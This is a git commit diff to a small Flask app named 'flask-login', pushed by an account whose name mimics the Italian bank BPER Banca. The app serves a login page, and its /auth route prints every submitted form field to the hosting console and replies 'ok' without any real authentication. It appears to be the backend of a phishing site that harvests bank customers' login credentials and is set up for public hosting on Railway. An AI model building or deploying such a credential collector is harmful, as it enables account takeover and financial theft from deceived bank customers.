9d36a55c56f45644d78deb51add5ff96b6dd08c4
bperbanca13-stack <bper.banca13@gmail.com>
2026-03-11 13:55:27 +0100

    server.py

--- flask-login/server.py
+++ flask-login/server.py
@@ -1,16 +1,19 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, make_response, send_file
+import os
 
 app = Flask(__name__)
 
-@app.route("/")
-def index():
-    return render_template("login.html")
-
 @app.route("/auth", methods=["POST"])
 def auth():
-    data = request.form.to_dict()
-    print(data)  # stampa in console su Railway
-    return jsonify({"status": "ok"})
+    print(request.form.to_dict())
+    return "ok"
+
+@app.route("/")
+def index():
+    response = make_response(render_template("login.html"))
+    response.headers.add("Access-Control-Allow-Origin", "*")
+    return response
 
 if __name__ == "__main__":
-    app.run()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
